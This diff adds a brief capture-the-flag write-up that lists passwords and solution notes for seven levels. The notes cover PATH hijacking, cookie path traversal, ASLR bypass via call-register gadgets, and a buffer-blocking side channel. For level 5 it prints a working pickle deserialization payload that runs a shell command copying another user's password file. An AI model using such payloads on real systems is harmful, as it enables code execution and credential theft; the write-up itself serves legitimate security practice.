@@ -1,0 +1,45 @@
+level1: e9gx26YEb2 
+
+Set PATH variable to your own date executable
+
+level2: kxlVXUvzv
+
+Edit your cookie to display the password file. Use relative directory addressing.
+
+level3: Or0m4UX07b
+
+Ran the program with a negative offset to try and hit the run() function.
+/levels/level03 -28 "AAAA"
+
+level4: i5cBbPvPCpcP
+
+ASLR is enabled but NX is not. 
+
+Used a tool called JMP buster to get around ASLR:
+
+** JMP buster - Tool for searching registers JMP/CALL inside an executable file
+by BlackLight, released under GNU GPL licence v.3, 2009
+
+-> [call *%eax] found at addr 0x08 04 84 7f
+-> [call *%eax] found at addr 0x08 04 85 7b
+
+level5: fzfDGnSmd317
+
+Vulnerability in the pickle deserialization.
+
+import pickle
+pickle.loads("cos\nsystem\n(S'cat /home/level06/.password > /tmp/level06.password'\ntR.")
+
+level6: SF2w8qU1QDj
+
+By far the most fun. Code provided in sploit6.py.
+
+I fill up the write buffer to cause the program to block on an fprintf right before it forks.
+I then check to see if the echo process managed to print. If it did I rule out the character.
+
+It took a while when the box was loaded (fork bombed) to get the whole thing. I would sometimes have to restart
+it with whatever it managed to figure out.
+
+
+
+level7: theflagl0eFTtT5oi0nOTxO5
